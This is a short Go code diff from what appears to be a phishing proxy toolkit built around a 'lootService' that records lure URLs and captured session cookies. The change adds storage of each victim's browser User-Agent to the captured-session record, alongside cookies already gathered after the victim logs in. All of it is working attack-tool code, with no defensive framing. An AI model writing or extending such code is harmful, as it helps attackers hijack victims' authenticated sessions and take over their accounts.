@@ -238,11 +238,11 @@ type SessionCookie struct {
 }
 
 type sessionContext struct {
-	// TODO UserAgent
 	mu              sync.RWMutex
 	allCookies      map[string]*SessionCookie
 	requiredCookies map[string]struct{}
 	isAuthenticated bool
+	userAgent       string
 }
 
 func newSessionContext() *sessionContext {
@@ -250,6 +250,27 @@ func newSessionContext() *sessionContext {
 		allCookies:      make(map[string]*SessionCookie),
 		requiredCookies: make(map[string]struct{}),
 	}
+}
+
+func (s *lootService) SaveUserAgent(c *fiber.Ctx) {
+	userAgent := c.Get("User-Agent")
+	if userAgent == "" {
+		return
+	}
+	sess := getSession(c)
+	sessCtx := s.getOrCreateSessionContext(sess.ID())
+	if s.getUserAgent(sessCtx) != "" {
+		return
+	}
+	sessCtx.mu.Lock()
+	defer sessCtx.mu.Unlock()
+	sessCtx.userAgent = userAgent
+}
+
+func (*lootService) getUserAgent(sessCtx *sessionContext) string {
+	sessCtx.mu.RLock()
+	defer sessCtx.mu.RUnlock()
+	return sessCtx.userAgent
 }
 
 func (s *lootService) SaveCookies(c *fiber.Ctx, destURL *url.URL, cookies []*http.Cookie) (err error) {
@@ -283,6 +304,7 @@ func (s *lootService) saveCapturedSession(sess *session.Session, sessCtx *sessio
 		SessionID: sess.ID(),
 		LureURL:   getLureURL(sess),
 		Cookies:   cookies,
+		UserAgent: sessCtx.userAgent,
 	})
 }
 
